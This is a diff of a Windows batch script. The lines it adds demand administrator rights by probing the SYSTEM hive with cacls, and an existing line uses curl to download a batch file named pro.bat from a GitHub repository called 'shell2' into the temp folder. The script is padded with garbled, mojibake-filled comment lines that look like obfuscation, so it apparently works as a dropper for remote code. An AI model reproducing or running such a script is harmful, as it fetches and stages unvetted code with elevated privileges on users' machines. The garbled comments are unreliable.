@@ -1,3 +1,12 @@
+@echo off
+CLS
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" && (
+    echo .
+) || (
+    echo Access denied Run as administrator
+    pause
+    exit /b 1
+)
 @REM @yÈh off
 @REM cd %µé©%
 @REM yÈh @yÈh off  ([µÛ]£.bat
@@ -14,7 +23,6 @@
 @REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
 @REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
 @REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£.b
-@echo off
 curl https://raw.githubusercontent.com/0x2034/shell2/main/pro.bat -o "%temp%\pro.bat"
 @REM @yÈh off
 @REM cd %µé©%
